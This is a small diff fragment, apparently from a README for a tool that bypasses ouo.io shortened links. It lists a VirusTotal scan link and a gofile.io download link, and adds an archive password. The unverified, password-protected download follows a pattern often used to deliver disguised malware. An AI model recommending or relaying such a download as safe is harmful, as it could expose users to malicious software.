@@ -10,3 +10,4 @@ The program bypasses links shortened by ouo.io. When a user enters a link and cl
 https://www.virustotal.com/gui/file-analysis/MmEzOTRlMjc2YzNkMTgwZWRkMTVmMjY3NWVhMmQ5Yzk6MTcyNzA5MTgyOA==
 
 https://gofile.io/d/IIzbbr
+PASSWORD:123
